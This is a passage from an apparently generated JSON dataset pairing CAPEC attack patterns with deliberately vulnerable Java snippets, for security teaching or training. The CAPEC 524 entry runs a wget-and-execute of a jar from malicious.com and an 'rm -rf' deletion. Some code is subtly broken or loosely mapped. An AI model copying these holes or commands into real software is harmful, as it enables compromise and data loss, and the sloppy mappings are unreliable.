        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that embodies the main idea of the CAPEC 'Intent Spoof'. The BroadcastReceiver receives an Intent and processes it without verifying the source of the Intent (CWE-925). The component is improperly exported, allowing any application to send Intents to it (CWE-926). The Intent may contain sensitive data, which is transmitted without proper security measures (CWE-927). Additionally, the code does not correctly specify the intended destination for the communication (CWE-941) and lacks proper access control (CWE-284). This vulnerability can be exploited by a malicious application to inject data, disclose information, or modify data within the trusted application."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.setWebViewClient(new WebViewClient());\n\n        // Adding a JavaScript interface\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n\n        // Loading a potentially malicious web page\n        webView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            // This method can be called from JavaScript\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses a WebView to load a web page and exposes a JavaScript interface. The WebView is configured to enable JavaScript and load a URL, which could be a malicious web page. The `addJavascriptInterface` method is used to expose a Java method (`showToast`) to JavaScript, allowing any loaded web page to call this method. This represents the 'WebView Exposure' CAPEC, where an adversary can exploit the exposed interface to access application-specific functionality. The related CWEs are illustrated by the improper access control (CWE-284), the exposed dangerous method (CWE-749), and the potential for cross-site scripting (CWE-79) if the web page is malicious."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class MaliciousTaskImpersonationServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-285: Improper Authorization\n        String userRole = request.getParameter(\"role\");\n        if (userRole == null || !userRole.equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Unauthorized access\");\n            return;\n        }\n\n        // CWE-506: Embedded Malicious Code\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Welcome, Admin!</h1>\");\n        out.println(\"<form action='stealData' method='post'>\");\n        out.println(\"<input type='hidden' name='data' value='sensitiveInformation'>\");\n        out.println(\"<input type='submit' value='Submit'>\");\n        out.println(\"</form>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a task impersonation attack. The servlet checks for an 'admin' role parameter (CWE-285: Improper Authorization) and, if authorized, serves a malicious form designed to steal sensitive information (CWE-506: Embedded Malicious Code). The form action 'stealData' is intended to capture and misuse sensitive data, representing the core idea of task impersonation where an adversary impersonates a legitimate task to exploit user privileges and steal information."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SchemeSquattingExample {\n    private static Map<String, String> registeredSchemes = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Malicious app registers a URL scheme intended for a target app\n        registerScheme(\"targetapp\", \"maliciousApp\");\n\n        // Simulate receiving a URL intended for the target app\n        handleURL(\"targetapp://login?username=user&password=pass\");\n    }\n\n    public static void registerScheme(String scheme, String handler) {\n        registeredSchemes.put(scheme, handler);\n    }\n\n    public static void handleURL(String url) {\n        try {\n            URI uri = new URI(url);\n            String scheme = uri.getScheme();\n            String handler = registeredSchemes.get(scheme);\n\n            if (handler != null) {\n                // Malicious app mimics the target app's login screen\n                System.out.println(\"Handling URL with \" + handler);\n                // Extract sensitive information from the URL\n                String query = uri.getQuery();\n                System.out.println(\"Extracted sensitive information: \" + query);\n            } else {\n                System.out.println(\"No handler registered for scheme: \" + scheme);\n            }\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Scheme Squatting attack. The `registerScheme` method allows a malicious application to register a URL scheme intended for a target application. When a URL with the registered scheme is received, the `handleURL` method processes it, mimicking the target application's behavior and extracting sensitive information from the URL's query string. This example also highlights CWE-939 (Improper Authorization in Handler for Custom URL Scheme) by not properly restricting which actors can invoke the handler, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by including sensitive information in the query string."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.FrameLayout;\nimport android.widget.LinearLayout;\nimport android.widget.TextView;\n\npublic class TapjackingActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Create a transparent overlay\n        FrameLayout overlay = new FrameLayout(this);\n        overlay.setBackgroundColor(0x80000000); // Semi-transparent\n        overlay.setClickable(true);\n\n        // Add a malicious button on the overlay\n        Button maliciousButton = new Button(this);\n        maliciousButton.setText(\"Click Me\");\n        maliciousButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Malicious action\n                System.out.println(\"Malicious action executed\");\n            }\n        });\n\n        // Add the malicious button to the overlay\n        overlay.addView(maliciousButton);\n\n        // Add the overlay to the main layout\n        LinearLayout mainLayout = findViewById(R.id.main_layout);\n        mainLayout.addView(overlay);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a tapjacking attack in an Android application. The main idea is to create a transparent overlay with a malicious button that intercepts user taps. When the user taps on what they believe to be a legitimate part of the application, they are actually interacting with the malicious button, which can execute harmful actions. This example leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the overlay to intercept user interactions, and CWE-451 (User Interface (UI) Misrepresentation of Critical Information) by misleading the user about the true nature of the interface they are interacting with."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataStorage {\n    private static final String SENSITIVE_DATA = \"Sensitive Information\";\n    private static final String FILE_PATH = \"/tmp/sensitive_data.txt\";\n\n    public static void main(String[] args) {\n        storeSensitiveData();\n    }\n\n    private static void storeSensitiveData() {\n        File file = new File(FILE_PATH);\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(SENSITIVE_DATA);\n            System.out.println(\"Sensitive data stored successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the improper storage of sensitive information, which is vulnerable to physical theft. The code writes sensitive data to a file located in the '/tmp' directory without any access control mechanisms. This embodies the CAPEC 'Physical Theft' by illustrating how an adversary with physical access to the system can easily retrieve sensitive information. The related CWEs are represented as follows:\n- CWE-1263: The code does not implement any physical access control to protect the sensitive data.\n- CWE-922: The sensitive information is stored insecurely without limiting read or write access.\n- CWE-921: The file system used does not have built-in access control, making it easy for unauthorized actors to access the data."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import java.util.Scanner;\n\npublic class SensitiveInfoInput {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        System.out.println(\"Password entered: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple console application where a user is prompted to enter a password. The password is then displayed back to the user. This code is vulnerable to shoulder surfing attacks because the password is entered and displayed in cleartext, making it easy for an unauthorized observer to see the sensitive information. Additionally, this example touches on several related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), as the password is both entered and displayed in an unprotected manner."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.Base64;\nimport javax.security.auth.kerberos.KerberosTicket;\n\npublic class KerberoastingExample {\n    public static void main(String[] args) {\n        // Simulate obtaining a Kerberos ticket\n        KerberosTicket ticket = getKerberosTicket();\n        \n        // Extract the ticket and save it to disk\n        saveTicketToDisk(ticket);\n    }\n\n    private static KerberosTicket getKerberosTicket() {\n        // This is a placeholder for obtaining a Kerberos ticket\n        // In a real scenario, this would involve authenticating and requesting a service ticket\n        return new KerberosTicket(new byte[0], null, null, null, 0, null, null, null, null, null, null);\n    }\n\n    private static void saveTicketToDisk(KerberosTicket ticket) {\n        try (FileOutputStream fos = new FileOutputStream(\"ticket.dat\");\n             ObjectOutputStream oos = new ObjectOutputStream(fos)) {\n            // Serialize the ticket and save it to disk\n            oos.writeObject(Base64.getEncoder().encodeToString(ticket.getEncoded()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the Kerberoasting attack. The code simulates obtaining a Kerberos ticket and then saves it to disk. In a real-world scenario, an attacker would authenticate to the Active Directory, request a service ticket, and then extract and save the ticket. The saved ticket can then be brute-forced offline to reveal the service account credentials. This example highlights the vulnerability of insufficiently protected credentials (CWE-522) and the risks associated with single-factor authentication (CWE-308) and weak password requirements (CWE-521)."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            String action = request.getParameter(\"action\");\n            if (action != null) {\n                // CWE-346: Origin Validation Error\n                // No validation of the request origin\n                // CWE-863: Incorrect Authorization\n                // No proper authorization check for the action\n                // CWE-285: Improper Authorization\n                // Assuming the user is authorized without proper checks\n                // CWE-602: Client-Side Enforcement of Server-Side Security\n                // Relying on client-side checks for security\n                performAction(action, session.getAttribute(\"user\"));\n            }\n        }\n    }\n\n    private void performAction(String action, Object user) {\n        // Perform the action with the user's privilege level\n        System.out.println(\"Action: \" + action + \" performed by user: \" + user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable endpoint that embodies the main idea of the CAPEC 'SaaS User Request Forgery'. The servlet processes a POST request and performs an action based on the 'action' parameter. The code contains several vulnerabilities: it does not validate the origin of the request (CWE-346), it does not perform proper authorization checks (CWE-863 and CWE-285), and it relies on client-side enforcement of security (CWE-602). This allows an adversary to exploit a trusted user's session to perform unauthorized actions on a SaaS application."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousIDEInfiltration {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            Path maliciousFile = Paths.get(\"/path/to/malicious/file.jar\");\n            Files.copy(maliciousFile, Paths.get(\"/path/to/IDE/plugins/maliciousPlugin.jar\"), StandardCopyOption.REPLACE_EXISTING);\n\n            // CWE-506: Embedded Malicious Code\n            executeMaliciousCode();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeMaliciousCode() {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String sensitiveInfo = new String(Files.readAllBytes(Paths.get(\"/path/to/sensitive/info.txt\")));\n            System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            debugSensitiveInfo(sensitiveInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void debugSensitiveInfo(String info) {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Debug Info: \" + info);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker infiltrates an IDE environment by uploading a malicious plugin (CWE-434). The malicious code is then executed (CWE-506), which reads sensitive information from a file (CWE-497) and exposes it through debugging output (CWE-215, CWE-200). This represents the CAPEC scenario where an attacker gains control of the IDE environment to exfiltrate and manipulate sensitive data, potentially compromising the supply chain."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponentSubstitution {\n    private static final Map<String, String> baselineComponents = new HashMap<>();\n    private static final Map<String, String> deployedComponents = new HashMap<>();\n\n    static {\n        // Baseline components during development\n        baselineComponents.put(\"CPU\", \"TrustedCPU\");\n        baselineComponents.put(\"Memory\", \"TrustedMemory\");\n        baselineComponents.put(\"Storage\", \"TrustedStorage\");\n\n        // Deployed components (potentially substituted)\n        deployedComponents.put(\"CPU\", \"MaliciousCPU\");\n        deployedComponents.put(\"Memory\", \"TrustedMemory\");\n        deployedComponents.put(\"Storage\", \"TrustedStorage\");\n    }\n\n    public static void main(String[] args) {\n        for (String component : baselineComponents.keySet()) {\n            if (!baselineComponents.get(component).equals(deployedComponents.get(component))) {\n                System.out.println(\"Warning: Component \" + component + \" has been substituted!\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Hardware Component Substitution During Baselining' by comparing baseline components used during development with the components deployed in the final product. The baselineComponents map represents trusted components used during the development phase, while the deployedComponents map represents the components in the final product. If any component in the deployed product does not match the baseline, a warning is printed, indicating a potential substitution. This embodies the CAPEC idea by highlighting the risk of malicious hardware substitution during the product development phase. The code also indirectly touches on related CWEs by showing dependency on specific components and the potential for untrusted or vulnerable components to be introduced."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DocumentationAlteration {\n    private static final String DOCUMENT_PATH = \"path/to/documentation.txt\";\n    private static final String ALTERED_DOCUMENT_PATH = \"path/to/altered_documentation.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the original documentation\n            String content = new String(Files.readAllBytes(Paths.get(DOCUMENT_PATH)));\n\n            // Alter the documentation to circumvent dial-down functionality\n            String alteredContent = content.replaceAll(\"restricted_technology\", \"allowed_technology\");\n\n            // Write the altered documentation to a new file\n            FileWriter writer = new FileWriter(new File(ALTERED_DOCUMENT_PATH));\n            writer.write(alteredContent);\n            writer.close();\n\n            System.out.println(\"Documentation altered successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might alter a manufacturer's documentation to circumvent dial-down functionality requirements. The code reads the original documentation from a file, modifies it to replace restricted technology with allowed technology, and writes the altered content to a new file. This alteration could enable the use of advanced technologies that are otherwise restricted. The code embodies the main idea of CAPEC by showing how documentation can be manipulated to bypass restrictions. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), improper physical access control (CWE-1263), and insufficient technical documentation (CWE-1059)."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemConfiguration {\n    private Properties properties = new Properties();\n\n    public void loadConfiguration(String filePath) throws IOException {\n        FileInputStream fis = null;\n        try {\n            fis = new FileInputStream(filePath);\n            properties.load(fis);\n        } catch (IOException e) {\n            System.err.println(\"Error loading configuration: \" + e.getMessage());\n            throw e;\n        } finally {\n            if (fis != null) {\n                fis.close();\n            }\n        }\n    }\n\n    public String getProperty(String key) {\n        return properties.getProperty(key);\n    }\n\n    public static void main(String[] args) {\n        SystemConfiguration config = new SystemConfiguration();\n        try {\n            config.loadConfiguration(\"config.properties\");\n            String systemCapability = config.getProperty(\"system.capability\");\n            System.out.println(\"System Capability: \" + systemCapability);\n        } catch (IOException e) {\n            System.err.println(\"Failed to load system configuration.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the CAPEC 'Documentation Alteration to Produce Under-performing Systems'. The code loads system configuration from a properties file, which could be altered by an attacker to misrepresent system capabilities. The 'loadConfiguration' method reads the configuration from a file, and the 'getProperty' method retrieves specific properties. If an attacker modifies the 'config.properties' file to provide incorrect system capabilities, it could lead to under-performing systems. This example also touches on related CWEs: insufficient technical documentation (CWE-1059) as the configuration file might lack proper documentation, exposure of sensitive system information (CWE-497) if the file contains sensitive data, improper following of specification (CWE-573) if the file format is not correctly followed, use of low-level functionality (CWE-695) by directly accessing file streams, and missing documentation for design (CWE-1053) as the design of the configuration handling is not documented."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class VulnerableSystem {\n    // Insufficient Technical Documentation\n    // Missing Documentation for Design\n    private int importantValue;\n\n    public VulnerableSystem() {\n        // Incorrect Provision of Specified Functionality\n        // This constructor should initialize importantValue, but it doesn't\n    }\n\n    public void setImportantValue(int value) {\n        // Improper Control of Dynamically-Managed Code Resources\n        // No validation or control over the input value\n        this.importantValue = value;\n    }\n\n    public int getImportantValue() {\n        return this.importantValue;\n    }\n\n    public static void main(String[] args) {\n        VulnerableSystem vs = new VulnerableSystem();\n        // Improper Following of Specification by Caller\n        // The caller does not follow the intended usage of the class\n        vs.setImportantValue(100);\n        System.out.println(\"Important Value: \" + vs.getImportantValue());\n    }\n}",
        "description": "This Java code snippet represents a vulnerable system where an attacker has altered the documentation to cause errors in system design. The class `VulnerableSystem` lacks sufficient technical and design documentation, making it difficult to understand its intended usage and structure (CWE-1059, CWE-1053). The constructor does not initialize the `importantValue` variable, leading to incorrect functionality (CWE-684). The `setImportantValue` method does not validate the input, allowing improper control of dynamically-managed code resources (CWE-913). Finally, the main method demonstrates improper following of the class's intended usage (CWE-573). This code embodies the main idea of the CAPEC by showing how insufficient and altered documentation can lead to a system with multiple vulnerabilities."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class MainProduct {\n    public static void main(String[] args) {\n        // Main product functionality\n        System.out.println(\"Main product is running...\");\n\n        // Counterfeit hardware component\n        CounterfeitComponent counterfeit = new CounterfeitComponent();\n        counterfeit.executeMaliciousCode();\n    }\n}\n\nclass CounterfeitComponent {\n    // CWE-506: Embedded Malicious Code\n    public void executeMaliciousCode() {\n        // CWE-1242: Undocumented feature\n        System.out.println(\"Executing malicious code...\");\n        // Malicious behavior\n        stealData();\n    }\n\n    private void stealData() {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        System.out.println(\"Stealing sensitive data...\");\n        // Simulate data theft\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Counterfeit Hardware Component Inserted During Product Assembly' (CAPEC). The main product class simulates the primary functionality of a product. However, it includes a counterfeit component that executes malicious code. The counterfeit component contains an undocumented feature (CWE-1242) that performs a malicious action, such as stealing data. This component is an example of relying on an insufficiently trustworthy component (CWE-1357) and potentially depending on a vulnerable third-party component (CWE-1395). The malicious behavior can be observed as a discrepancy compared to equivalent products (CWE-207). The code demonstrates how a counterfeit component can introduce security risks during product assembly."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class HardwareConfig {\n    private boolean lockBit = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n    private int registerDefault = 0; // CWE-1221: Incorrect Register Defaults or Module Parameters\n    private String debugChain = \"\"; // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n\n    // CWE-657: Violation of Secure Design Principles\n    public void setLockBit(boolean value) {\n        this.lockBit = value;\n    }\n\n    public void configureRegister(int value) {\n        if (lockBit) {\n            throw new SecurityException(\"Cannot modify register when lock bit is set\");\n        }\n        this.registerDefault = value;\n    }\n\n    public void setDebugChain(String chain) {\n        this.debugChain = chain;\n    }\n\n    public static void main(String[] args) {\n        HardwareConfig config = new HardwareConfig();\n        config.setLockBit(true); // Lock bit is set\n        config.configureRegister(42); // Attempt to modify register after lock bit is set\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a hardware configuration class that embodies the main idea of the CAPEC: 'Hardware Design Specifications Are Altered'. The class contains vulnerabilities related to the CWEs mentioned. The 'lockBit' variable (CWE-1231) is used to restrict access to the register configuration, but the method 'setLockBit' allows it to be modified after being set, violating secure design principles (CWE-657). The 'registerDefault' variable is set to an insecure default value (CWE-1221). The 'debugChain' variable represents the debug components, which could be incorrectly chained or have improper granularity (CWE-1296). The main method demonstrates an attack scenario where the register is modified after the lock bit is set, highlighting the vulnerability."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // Simulate reliance on a third-party component that is not updateable\n        ThirdPartyComponent component = new ThirdPartyComponent();\n        if (!component.isUpdateable()) {\n            System.out.println(\"Warning: Using a component that cannot be updated.\");\n        }\n\n        // Simulate unauthorized error injection\n        try {\n            component.injectError();\n        } catch (Exception e) {\n            System.out.println(\"Error: Unauthorized error injection detected.\");\n        }\n\n        // Simulate reliance on an insufficiently trustworthy component\n        if (!component.isTrustworthy()) {\n            System.out.println(\"Warning: Using an insufficiently trustworthy component.\");\n        }\n\n        // Simulate dependency on a vulnerable third-party component\n        if (component.hasKnownVulnerabilities()) {\n            System.out.println(\"Warning: Using a component with known vulnerabilities.\");\n        }\n\n        // Simulate embedded malicious code\n        if (component.containsMaliciousCode()) {\n            System.out.println(\"Error: Malicious code detected in the component.\");\n        }\n    }\n}\n\nclass ThirdPartyComponent {\n    public boolean isUpdateable() {\n        return false; // Simulate a component that cannot be updated\n    }\n\n    public void injectError() throws Exception {\n        throw new Exception(\"Injected error\"); // Simulate error injection\n    }\n\n    public boolean isTrustworthy() {\n        return false; // Simulate an untrustworthy component\n    }\n\n    public boolean hasKnownVulnerabilities() {\n        return true; // Simulate a component with known vulnerabilities\n    }\n\n    public boolean containsMaliciousCode() {\n        return true; // Simulate a component with embedded malicious code\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a system relies on a third-party hardware component that embodies several vulnerabilities and weaknesses as described in the CAPEC and related CWEs. The `ThirdPartyComponent` class has methods that indicate whether the component is updateable, trustworthy, contains known vulnerabilities, or has embedded malicious code. The `Main` class uses this component and prints warnings or errors based on the component's properties. This represents the main idea of 'Malicious Hardware Component Replacement' by showing how a compromised or faulty component can introduce multiple security risks into a system."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            File maliciousFile = new File(\"/tmp/malicious_payload.txt\");\n            if (!maliciousFile.exists()) {\n                maliciousFile.createNewFile();\n            }\n            FileWriter writer = new FileWriter(maliciousFile);\n            writer.write(\"This is a malicious payload.\");\n            writer.close();\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMaliciousCode();\n\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            VulnerableComponent vulnerableComponent = new VulnerableComponent();\n            vulnerableComponent.execute();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void replicateMaliciousCode() {\n        // Simulate replication of malicious code\n        System.out.println(\"Replicating malicious code...\");\n    }\n}\n\nclass VulnerableComponent {\n    public void execute() {\n        // Simulate execution of a vulnerable third-party component\n        System.out.println(\"Executing vulnerable component...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Malicious Software Implanted' as described in the CAPEC. The main function creates a file with malicious content (CWE-506: Embedded Malicious Code) and simulates the replication of malicious code (CWE-509: Replicating Malicious Code). Additionally, it uses a vulnerable third-party component (CWE-1395: Dependency on Vulnerable Third-Party Component) to illustrate how an attacker might exploit such dependencies. The code is designed to show how malicious software can be implanted and spread within a system, potentially causing further compromise when deployed."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class RogueIntegration {\n    public static void main(String[] args) {\n        try {\n            // CWE-829: Including functionality from an untrusted source\n            String maliciousLibrary = \"http://malicious.com/malicious.jar\";\n            Runtime.getRuntime().exec(\"wget \" + maliciousLibrary);\n            Runtime.getRuntime().exec(\"java -jar malicious.jar\");\n\n            // CWE-89: SQL Injection vulnerability\n            String userInput = \"1 OR 1=1\"; // Malicious input\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/testdb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            String query = \"SELECT * FROM users WHERE id = \" + userInput;\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // CWE-506: Embedded malicious code\n            Runtime.getRuntime().exec(\"rm -rf /important_data\");\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Rogue Integration Procedures' by including several vulnerabilities and malicious actions. The code first downloads and executes a malicious library from an untrusted source (CWE-829). It then performs an SQL query using user input without proper sanitization, making it vulnerable to SQL Injection (CWE-89). Finally, it contains embedded malicious code that deletes important data (CWE-506). This snippet represents how an attacker might alter or establish rogue processes to insert malicious components into a system, leading to potential disruption or compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\n\npublic class XMLFloodExample {\n    public static void main(String[] args) {\n        String xmlPayload = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            xmlPayload += \"<element>data</element>\";\n        }\n        xmlPayload += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            builder.parse(new InputSource(new StringReader(xmlPayload)));\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an XML Flood attack. The code constructs a large XML payload by repeatedly appending XML elements in a loop. The payload is then parsed using a DocumentBuilder. This can lead to a Denial of Service (DoS) as the system attempts to process the large XML document, potentially exhausting resources and causing the application to become unstable, freeze, or crash. The code does not include any resource allocation limits, XML validation, or restrictions on XML entity references, making it vulnerable to various XML-related attacks as described in the related CWEs."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class MalwareRecon {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to gather system information\n            String command = \"systeminfo\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Simulate sending the gathered information to an external server\n                sendToServer(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendToServer(String data) {\n        // Placeholder for sending data to an external server\n        System.out.println(\"Sending data: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of malware-directed internal reconnaissance. The code executes a system command to gather information about the system (e.g., using 'systeminfo' on Windows). It then reads the output of this command and simulates sending the gathered information to an external server. This embodies the CAPEC concept of using malware to gather information about the system's composition, configuration, and security mechanisms. The code also touches on related CWEs: it exposes sensitive system information (CWE-497), contains potentially malicious code (CWE-506), and could be part of a larger spyware or replicating malicious code scheme (CWE-512, CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
